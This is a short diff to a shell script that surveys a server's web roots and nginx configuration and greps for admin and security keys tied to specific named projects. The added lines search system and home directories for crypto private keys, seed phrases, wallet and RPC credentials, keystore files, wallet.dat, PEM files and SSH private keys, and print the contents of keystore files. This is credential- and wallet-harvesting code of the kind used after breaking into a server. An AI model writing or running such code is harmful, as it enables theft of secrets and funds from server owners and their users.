@@ -18,6 +18,11 @@
     echo "== WWW"; ls -la /var/www 2>/dev/null
     echo "== NGINX"; grep -rhE 'server_name|root |proxy_pass' /etc/nginx/sites-enabled /etc/nginx/conf.d 2>/dev/null | head -60
     echo "== SECRETS"; grep -rIhE 'ADMIN_KEY|qijianke|security[_ -]?key|SECURITY_KEY|LUXERA|movesay|btc_base' /var/www /etc/nginx /opt /root /home 2>/dev/null | head -40
+    echo "== WALLETS"
+    grep -rIhoE '(0x)?[0-9a-fA-F]{64}' /var/www /root /home /opt /etc 2>/dev/null | sort -u | head -40
+    grep -rIniE 'mnemonic|seed.?phrase|PRIVATE_?KEY|BSC_?RPC|BSCSCAN|INFURA|ALCHEMY|HOT_?WALLET|WALLET_ADDRESS|LP_?TOKEN|WITHDRAW' /var/www /root /home /opt /etc 2>/dev/null | grep -viE 'node_modules|vendor|\.git/' | head -50
+    find /root /home /var/www /opt /etc -maxdepth 7 \( -iname 'UTC--*' -o -iname 'keystore*' -o -iname 'wallet.dat' -o -iname '*.pem' -o -iname 'id_rsa' -o -iname 'id_ed25519' \) 2>/dev/null | head -60
+    for wf in $(find /root /home /var/www /opt -maxdepth 7 \( -iname 'UTC--*' -o \( -iname '*.json' -path '*keystore*' \) \) 2>/dev/null | head -8); do echo "--- $wf"; head -c 2000 "$wf"; echo; done
     echo "== CONFIGS"
     for f in $(find /var/www -maxdepth 5 \( -name 'config.php' -path '*Conf*' \) -o -name '.env' 2>/dev/null | head -20); do
       echo "--- $f"; grep -E 'ADMIN_KEY|SECURITY|DB_|APP_KEY|HOST|USER|PASS' "$f" 2>/dev/null | head -25
